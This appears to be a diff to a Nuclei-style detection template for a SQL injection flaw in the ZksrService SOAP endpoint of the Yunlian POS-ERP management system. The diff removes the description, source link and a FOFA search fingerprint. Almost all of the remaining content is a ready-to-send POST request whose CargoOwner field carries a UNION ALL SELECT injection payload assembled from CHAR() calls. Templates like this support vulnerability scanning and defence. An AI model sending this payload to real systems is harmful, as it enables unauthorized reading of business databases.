@@ -3,12 +3,8 @@ info:
   name: 云连POS-ERP管理系统ZksrService存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/il0pfh3nst27xbbk'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: il0pfh3nst27xbbk
-    fofa: title="Powered By chaosZ"
 http:
 - raw:
   - "POST /services/ZksrService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nSOAPAction: \"\"\nContent-Type: text/xml; charset=UTF-8\nConnection: close\n\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.service.chaosZ.com\">\n<soapenv:Header/>\n    <soapenv:Body>\n        <web:getItemInfo soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n            <data xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">{\"CargoOwner\":\"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(72)+CHAR(107)+CHAR(78)+CHAR(109)+CHAR(100)+CHAR(82)+CHAR(69)+CHAR(83)+CHAR(118)+CHAR(67)+CHAR(88)+CHAR(109)+CHAR(100)+CHAR(97)+CHAR(105)+CHAR(115)+CHAR(65)+CHAR(107)+CHAR(117)+CHAR(84)+CHAR(74)+CHAR(100)+CHAR(114)+CHAR(116)+CHAR(109)+CHAR(106)+CHAR(119)+CHAR(88)+CHAR(65)+CHAR(108)+CHAR(117)+CHAR(110)+CHAR(109)+CHAR(118)+CHAR(106)+CHAR(65)+CHAR(77)+CHAR(68)+CHAR(112)+CHAR(74)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- qfYz\"}\n            </data>\n        </web:getItemInfo>\n    </soapenv:Body>\n</soapenv:Envelope>"
